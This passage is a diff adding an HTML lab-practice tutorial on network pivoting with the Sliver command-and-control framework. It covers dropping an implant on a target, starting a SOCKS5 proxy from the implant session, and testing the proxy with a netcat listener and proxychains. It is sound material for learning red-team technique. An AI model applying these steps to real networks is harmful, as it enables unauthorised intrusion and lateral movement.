+From here, I used <code>scp</code> to copy the binary over to the target. Remember since this is technique specific practice and not methodology specific, we are not trying to add complexity with also figuring out how to transfer a file. Once we see the call back on the sliver client side, we can begin to interact with it by running <code>sessions -i &lt;session_id&gt;</code>. This will drop us into the session of our generated payload, and setting up the pivots are quite easy.
+</p>
+
+<p>
+Sliver gives us two options for pivoting out of the box:
+</p>
+<ol class="org-ol">
+<li>SOCKS5 Proxy - This is the same type of proxy that can be utilized with proxychains with non-sliver tooling.</li>
+<li>TCP Pivot - This is a pivot that allows us to use a Sliver Implant (session or beacon) to have all of the functionality of the Sliver toolkit while allowing us to pivot deeper into the network.</li>
+</ol>
+</div>
+
+<div id="outline-container-org1886e35" class="outline-3">
+<h3 id="org1886e35"><span class="section-number-3">6.1.</span> SOCKS5 Proxy</h3>
+<div class="outline-text-3" id="text-6-1">
+<ul class="org-ul">
+<li>We will start with this one as it is the easy to setup.</li>
+<li>Once in the implant session, simply type <code>socks5 start</code></li>
+</ul>
+
+<pre class="example">
+sliver (FASCINATING_THUNDER) &gt; socks5 start
+
+[*] Started SOCKS5 127.0.0.1 1081  
+   In-band SOCKS proxies can be a little unstable depending on protocol
+
+</pre>
+
+<p>
+This gives us everything we need to do to proxy to this proxy.
+</p>
+<ol class="org-ol">
+<li>using beta machine, run <code>nc -nlvp 9494</code></li>
+<li>using attacking machine, add the SOCKS5 information from the output of the implant session to your <code>/etc/proxychains4.conf</code> file, in the case above it is <code>127.0.0.1 1081</code></li>
+<li>using attacking machine, run <code>proxychains wget http://172.16.100.13:9494/</code> and confirm on beta box <code>nc</code> connection received</li>
+</ol>
+</div>
+</div>
+
+<div id="outline-container-org8aac047" class="outline-3">
+<h3 id="org8aac047"><span class="section-number-3">6.2.</span> TCP Pivot</h3>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<p class="date">Date: 2022-12-09</p>
+<p class="author">Author: Russell Brinson</p>
+</div>
+</body>
+</html>
